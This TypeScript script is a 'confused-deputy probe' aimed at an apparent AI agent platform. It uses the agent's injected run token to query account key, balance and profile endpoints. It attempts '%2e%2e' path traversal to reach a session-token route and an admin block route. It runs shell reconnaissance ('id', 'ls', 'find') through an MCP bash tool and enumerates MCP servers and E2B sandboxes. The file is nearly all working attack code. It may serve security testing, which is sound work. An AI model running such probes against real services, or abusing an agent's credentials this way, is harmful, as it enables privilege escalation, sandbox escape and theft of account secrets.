// Confused-deputy probe: exercise gen/enter routes with the agent RUN TOKEN.
// The platform injects "Authorization: Bearer ag_..." for gen-origin requests only,
// so we must call through pollinations() (relative paths) and observe status/body.

type Pollinations = (path: string, init?: RequestInit) => Promise<Response>;

type Runtime = {
    request: Request;
    pollinations: Pollinations;
};

async function probe(
    P: Pollinations,
    label: string,
    path: string,
    init?: RequestInit,
) {
    try {
        const res = await P(path, init);
        const text = await res.text();
        return { label, path, status: res.status, body: text.slice(0, 1400) };
    } catch (e) {
        return { label, path, error: String(e).slice(0, 400) };
    }
}

function post(body: unknown): RequestInit {
    return {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(body),
    };
}

export default async function (rt: Runtime) {
    const P = rt.pollinations;
    const rpc = (id: number, method: string, params: unknown) => ({
        jsonrpc: "2.0",
        id,
        method,
        params: params ?? {},
    });

    const results: unknown[] = [];

    // --- gen routes reachable directly with the run token ---
    results.push(await probe(P, "gen /v1/models", "/v1/models"));
    // --- gen -> enter proxy (/account/* -> /api/account/*) with the run token ---
    results.push(await probe(P, "enter /api/account/balance", "/account/balance"));
    results.push(await probe(P, "enter /api/account/profile", "/account/profile"));
    results.push(await probe(P, "enter /api/account/keys", "/account/keys"));
    results.push(await probe(P, "enter /api/account/agents", "/account/agents"));
    results.push(await probe(P, "enter /api/account/key/usage", "/account/key/usage"));
    results.push(await probe(P, "enter /api/quests/catalog", "/quests/catalog"));
    // try to reach enter /api/session-token via ../ (client URL normalizes, control test)
    results.push(await probe(P, "enter /api/session-token (via ..)", "/account/%2e%2e/session-token"));
    results.push(await probe(P, "enter /api/admin/sites/x/block (via ..)", "/account/%2e%2e/admin/sites/x/block", post({})));
    // --- MCP servers via gen (agentRun gating) ---
    results.push(await probe(P, "mcp computer tools/list", "/mcp/computer", post(rpc(1, "tools/list", {}))));
    results.push(await probe(P, "mcp computer bash id", "/mcp/computer", post(rpc(2, "tools/call", {
        name: "bash",
        arguments: { command: "id; pwd; echo HOME=$HOME; ls -la /workspace 2>/dev/null | head -20; echo '--- files ---'; find /workspace -maxdepth 2 -type f 2>/dev/null | head -20" },
    }))));
    results.push(await probe(P, "mcp composio tools/list", "/mcp/composio", post(rpc(3, "tools/list", {}))));
    results.push(await probe(P, "mcp machines tools/list", "/mcp/machines", post(rpc(4, "tools/list", {}))));
    results.push(await probe(P, "mcp pollinations tools/list", "/mcp/pollinations", post(rpc(5, "tools/list", {}))));
    // --- E2B sandbox (account:machines) ---
    results.push(await probe(P, "e2b sandboxes list", "/alpha/e2b/sandboxes"));

    return Response.json({ probe: "agtoken", results });
}
